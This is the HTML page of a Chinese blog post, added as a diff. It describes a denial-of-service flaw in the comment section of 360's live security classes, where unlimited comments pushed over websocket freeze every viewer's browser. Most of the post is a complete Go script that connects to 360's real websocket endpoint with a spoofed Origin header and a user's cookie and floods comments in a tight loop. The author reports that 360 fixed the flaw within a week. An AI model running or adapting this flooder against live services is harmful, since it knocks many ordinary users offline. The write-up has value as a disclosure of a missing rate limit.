@@ -1,0 +1,204 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>利用360直播课评论区对用户浏览器dos攻击 - zu1k</title><meta name=description content="A boy dreaming of traveling around the world.<br>This blog is used to record my study, thinking and life."><meta name=keywords content="zu1k,zuik,zu1k.com,网络安全,思考,逆向"><meta name=author content="zu1k"><meta property="og:title" content="利用360直播课评论区对用户浏览器dos攻击"><meta property="og:description" content="前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错 对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数5"><meta property="og:type" content="article"><meta property="og:url" content="https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/"><meta property="og:image" content="https://zu1k.com/images/logo.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-05-29T14:01:45+08:00"><meta property="article:modified_time" content="2023-01-03T09:11:33+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zu1k.com/images/logo.jpg"><meta name=twitter:title content="利用360直播课评论区对用户浏览器dos攻击"><meta name=twitter:description content="前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错 对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数5"><meta name=application-name content="zu1k"><meta name=apple-mobile-web-app-title content="zu1k"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><meta itemprop=name content="利用360直播课评论区对用户浏览器dos攻击"><meta itemprop=description content="前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错 对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数5"><meta itemprop=datePublished content="2020-05-29T14:01:45+08:00"><meta itemprop=dateModified content="2023-01-03T09:11:33+08:00"><meta itemprop=wordCount content="599"><meta itemprop=image content="https://zu1k.com/images/logo.jpg"><meta itemprop=keywords content="coding,dos,"><link rel="shortcut icon" type=image/x-icon href=../../../../favicon.ico><link rel=icon type=image/png sizes=32x32 href=../../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../../favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=../../../../apple-touch-icon.png><link rel=mask-icon href=../../../../apple-touch-icon.png color=#5bbad5><link rel=manifest href=../../../../site.webmanifest><link rel=canonical href=https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/><link rel=prev href=https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/><link rel=next href=https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/><link rel=stylesheet href=../../../../lib/normalize/normalize.min.css><link rel=stylesheet href=../../../../css/style.min.css><link rel=stylesheet href=../../../../lib/icon/css/icon-embedded.css><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw_local.js")})</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"利用360直播课评论区对用户浏览器dos攻击","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/zu1k.com\/posts\/security\/web-security\/dos-attack-on-360-university-user\/"},"image":[{"@type":"ImageObject","url":"https:\/\/zu1k.com\/images\/logo.jpg","width":256,"height":256}],"genre":"posts","keywords":"coding, dos","wordcount":599,"url":"https:\/\/zu1k.com\/posts\/security\/web-security\/dos-attack-on-360-university-user\/","datePublished":"2020-05-29T14:01:45+08:00","dateModified":"2023-01-03T09:11:33+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"zu1k","logo":"https:\/\/zu1k.com\/images\/logo.jpg"},"author":{"@type":"Person","name":"zu1k"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu><div class=menu-inner><a class=menu-item href=../../../../posts/>文章 </a><a class=menu-item href=../../../../categories/>分类 </a><a class=menu-item href=../../../../tags/>标签 </a><a class=menu-item href=../../../../projects/>项目 </a><a class=menu-item href=../../../../links/>友链 </a><a class=menu-item href=../../../../about/>关于 </a><a class=menu-item href=../../../../index.xml title=RSS><i class=icon-rss></i> </a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class=icon-search></i></a>
+<a class="search-button search-clear" id=search-clear-desktop title=清空><i class=icon-cancel-circled></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class=icon-spin2></i></span>
+</span><a class="menu-item theme-switch" title=切换主题><i class=icon-adjust></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class=icon-search></i></a>
+<a class="search-button search-clear" id=search-clear-mobile title=清空><i class=icon-cancel-circled></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class=icon-spin2></i></span></div><a class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=../../../../posts/ title>文章</a><a class=menu-item href=../../../../categories/ title>分类</a><a class=menu-item href=../../../../tags/ title>标签</a><a class=menu-item href=../../../../projects/ title>项目</a><a class=menu-item href=../../../../links/ title>友链</a><a class=menu-item href=../../../../about/ title>关于</a><a class=menu-item href=../../../../index.xml title=RSS><i class=icon-rss></i></a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i></a><a class="menu-item theme-switch" title=切换主题>
+<i class=icon-adjust></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><article class="page single"><h1 class=single-title>利用360直播课评论区对用户浏览器dos攻击</h1><div class=post-meta><div class=post-meta-line>&nbsp;<span class=post-category>收录于 <a href=../../../../categories/coding/><i class=icon-folder></i>编程</a></span></div><div class=post-meta-line><i class=icon-calendar></i>&nbsp;<time datetime=2020-05-29>2020-05-29</time>&nbsp;<i class=icon-pencil></i>&nbsp;约 599 字&nbsp;
+<i class=icon-clock></i>&nbsp;阅读 2 分钟&nbsp;</div></div><div class=content id=content><p>前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错</p><p>对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制</p><p>并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众</p><p>用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击</p><p>评论代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;log&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;net/http&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;net/url&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;os&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;os/signal&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;time&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/gorilla/websocket&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>addr</span> <span class=p>=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>String</span><span class=p>(</span><span class=s>&#34;addr&#34;</span><span class=p>,</span> <span class=s>&#34;trans.college.360.cn&#34;</span><span class=p>,</span> <span class=s>&#34;http service address&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=nx>log</span><span class=p>.</span><span class=nf>SetFlags</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>interrupt</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>(</span><span class=kd>chan</span> <span class=nx>os</span><span class=p>.</span><span class=nx>Signal</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=nx>signal</span><span class=p>.</span><span class=nf>Notify</span><span class=p>(</span><span class=nx>interrupt</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>Interrupt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>u</span> <span class=o>:=</span> <span class=nx>url</span><span class=p>.</span><span class=nx>URL</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>Scheme</span><span class=p>:</span> <span class=s>&#34;wss&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>		<span class=nx>Host</span><span class=p>:</span> <span class=o>*</span><span class=nx>addr</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>		<span class=nx>Path</span><span class=p>:</span> <span class=s>&#34;/ws&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>		<span class=nx>RawQuery</span><span class=p>:</span> <span class=s>&#34;live_course_id=10114&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;connecting to %s&#34;</span><span class=p>,</span> <span class=nx>u</span><span class=p>.</span><span class=nf>String</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>header</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>Header</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=nx>header</span><span class=p>[</span><span class=s>&#34;Origin&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=p>[]</span><span class=kt>string</span><span class=p>{</span><span class=s>&#34;https://admin.college.360.cn&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>header</span><span class=p>[</span><span class=s>&#34;User-Agent&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=p>[]</span><span class=kt>string</span><span class=p>{</span><span class=s>&#34;Chrome/80.0.3987.122&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>header</span><span class=p>[</span><span class=s>&#34;Cookie&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=p>[]</span><span class=kt>string</span><span class=p>{</span><span class=s>&#34;your cookie&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>dialer</span> <span class=o>:=</span> <span class=nx>websocket</span><span class=p>.</span><span class=nx>DefaultDialer</span>
+</span></span><span class=line><span class=cl>	<span class=nx>dialer</span><span class=p>.</span><span class=nx>EnableCompression</span> <span class=p>=</span> <span class=kc>true</span>
+</span></span><span class=line><span class=cl>	<span class=nx>c</span><span class=p>,</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>dialer</span><span class=p>.</span><span class=nf>Dial</span><span class=p>(</span><span class=nx>u</span><span class=p>.</span><span class=nf>String</span><span class=p>(),</span> <span class=nx>header</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;dial:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>done</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>(</span><span class=kd>chan</span> <span class=kd>struct</span><span class=p>{})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>go</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>defer</span> <span class=nb>close</span><span class=p>(</span><span class=nx>done</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nx>_</span><span class=p>,</span> <span class=nx>message</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>ReadMessage</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;read:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>				<span class=k>return</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;recv: %s&#34;</span><span class=p>,</span> <span class=nx>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>ticker</span> <span class=o>:=</span> <span class=nx>time</span><span class=p>.</span><span class=nf>NewTicker</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>ticker</span><span class=p>.</span><span class=nf>Stop</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>select</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=o>&lt;-</span><span class=nx>done</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=k>return</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=o>&lt;-</span><span class=nx>ticker</span><span class=p>.</span><span class=nx>C</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>WriteMessage</span><span class=p>(</span><span class=nx>websocket</span><span class=p>.</span><span class=nx>TextMessage</span><span class=p>,</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>					<span class=s>&#34;{\&#34;cmd\&#34;:\&#34;newMessage\&#34;,\&#34;message\&#34;:\&#34;感谢360\&#34;}&#34;</span>
+</span></span><span class=line><span class=cl>				<span class=p>))</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;write:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>				<span class=k>return</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=o>&lt;-</span><span class=nx>interrupt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;interrupt&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>WriteMessage</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>				<span class=nx>websocket</span><span class=p>.</span><span class=nx>CloseMessage</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>				<span class=nx>websocket</span><span class=p>.</span><span class=nf>FormatCloseMessage</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>					<span class=nx>websocket</span><span class=p>.</span><span class=nx>CloseNormalClosure</span><span class=p>,</span> <span class=s>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>				<span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;write close:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>				<span class=k>return</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=k>select</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=o>&lt;-</span><span class=nx>done</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=o>&lt;-</span><span class=nx>time</span><span class=p>.</span><span class=nf>After</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nx>Second</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=k>return</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-01-03&nbsp;<a class=git-hash href=https://github.com/zu1k/blog/commit/ae3381bc545582a739ebaf7d8a620343711c9cfa target=_blank title="commit by zu1k(i@zu1k.com) ae3381bc545582a739ebaf7d8a620343711c9cfa: init">
+<i class=icon-hashtag></i>ae3381b</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=../../../../posts/security/web-security/dos-attack-on-360-university-user/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a title="分享到 Twitter" data-sharer=twitter data-url=https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/ data-title=利用360直播课评论区对用户浏览器dos攻击 data-via=zu1k_lv data-hashtags=coding,dos><i class=icon-twitter></i>
+</a><a title="分享到 Tumblr" data-sharer=tumblr data-url=https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/ data-title=利用360直播课评论区对用户浏览器dos攻击 data-tags=coding,dos><i class=icon-tumblr></i>
+</a><a title="分享到 Evernote" data-sharer=evernote data-url=https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/ data-title=利用360直播课评论区对用户浏览器dos攻击><i class=icon-evernote></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class=icon-tags></i>&nbsp;<a href=../../../../tags/coding/>编程</a>,&nbsp;<a href=../../../../tags/dos/>dos</a></section><section><span><a onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=../../../../>主页</a></span></section></div><div class=post-nav><a href=../../../../posts/events/why-reveice-connection-from-class-e-ip/ class=prev rel=prev title=一个来自保留IP地址的连接><i class=icon-angle-left></i>一个来自保留IP地址的连接</a>
+<a href=../../../../posts/security/web-security/yuketang-exam-block-report/ class=next rel=next title=屏蔽雨课堂在线考试异常上报>屏蔽雨课堂在线考试异常上报<i class=icon-angle-right></i></a></div></div><div id=comments><div class=giscus id=giscus></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/zh-CN>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class=icon-copyright></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://zu1k.com target=_blank>zu1k</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class=icon-up></i>
+</a><a id=view-comments class=fixed-button title=查看评论><i class=icon-comment></i></a></div><link rel=stylesheet href=../../../../lib/lightgallery/lightgallery.min.css><script type=text/javascript src=../../../../lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=../../../../lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=../../../../lib/fuse/fuse.min.js></script><script type=text/javascript src=../../../../lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=../../../../lib/instant-page/5.1.0.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=../../../../lib/clipboard/clipboard.min.js></script><script type=text/javascript src=../../../../lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:100},comment:{giscus:{category:"Comments",categoryid:"DIC_kwDOEfJ9084CA02V",enable:!0,mapping:"og:title",repo:"zu1k/blog",repoid:"MDEwOlJlcG9zaXRvcnkzMDExMDQ1OTU="}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!0,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.1,type:"fuse",useExtendedSearch:!1}}</script><script type=text/javascript src=../../../../js/theme.min.js></script></body></html>
